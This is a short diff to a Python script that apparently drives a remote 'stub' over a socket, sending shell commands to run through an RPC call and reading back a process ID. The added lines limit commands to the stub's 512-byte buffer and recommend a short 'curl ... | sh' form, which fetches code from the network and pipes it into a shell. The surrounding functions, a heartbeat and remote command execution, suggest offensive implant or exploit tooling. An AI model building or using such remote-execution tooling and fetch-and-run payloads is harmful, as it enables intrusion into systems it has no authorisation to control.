@@ -45,6 +45,9 @@ def start_heartbeat(url, interval):
 
 def run(rpc, cmd, wait=120.0):
     buf = b"-c\x00" + cmd.encode()
+    if len(buf) > 512:
+        raise SystemExit(f"[-] command is {len(buf)} B; the stub's cmdbuf is 512 B "
+                         f"(use a short 'curl ... | sh' form)")
     rpc._cmd(7, 0, 0, len(buf))
     rpc.s.sendall(buf)
     pid = struct.unpack("<i", rpc._recv_exact(4))[0]
